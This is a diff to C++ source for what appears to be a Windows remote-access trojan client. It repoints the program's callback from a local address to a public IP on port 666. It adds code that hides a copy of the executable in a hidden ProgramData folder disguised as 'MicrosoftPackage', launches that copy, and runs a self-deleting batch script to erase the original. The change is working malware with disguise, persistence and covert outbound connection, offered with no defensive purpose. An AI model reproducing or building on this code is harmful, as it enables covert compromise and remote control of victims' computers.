@@ -12,8 +12,8 @@
 #include <gdiplus.h>
 
 #define PORT 666
-#define SERVERADDR "192.168.1.69"
-#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+#define SERVERADDR "178.140.177.195" //178.140.177.195
+//#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 #pragma comment(lib,"Ws2_32.lib")
 #pragma comment(lib, "GdiPlus.lib")
 
@@ -30,10 +30,24 @@ int main()
 	while (1) {
 	char buffer2[256] = "";
 	GetModuleFileName(NULL, buffer2, sizeof(buffer2) / sizeof(buffer2[0]));
-	std::string src = buffer2;
-	std::string dst("C:\\Client.exe");
-	std::string cmd = "copy " + src + " " + dst;
-//	system(cmd.c_str());
+	if (CreateDirectory("c:\\
+		ProgramData\\MicrosoftPackage", NULL)) {
+		SetFileAttributes("C:\\ProgramData\\MicrosoftPackage", FILE_ATTRIBUTE_HIDDEN);
+		std::string src = buffer2;
+		std::string dst("C:\\ProgramData\\MicrosoftPackage\\Client.exe");
+		std::string cmd = "copy " + src + " " + dst;
+		system(cmd.c_str());
+
+		ShellExecute(NULL, "open", "explorer.exe", "C:\\ProgramData\\MicrosoftPackage\\Client.exe", NULL, SW_SHOWNORMAL);
+		char delfile[] = "@echo off\n:loop\ndel Client.exe\nif exist 1.txt goto : loop\ndel %0";
+		ofstream File;
+		File.open("del.bat");
+		File << delfile;
+		File.close();
+		system("start del.bat");
+		return 0;
+
+	}
 	char dir[FILENAME_MAX];
 	_getcwd(dir, sizeof(dir));
 	char temp[] = "\\C.exe";
@@ -52,7 +66,6 @@ int main()
 	for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
 		buff[i] = '\0';
 	}
-
 	if (WSAStartup(0x202, (WSADATA *)&buff[0]))
 	{
 		return -1;
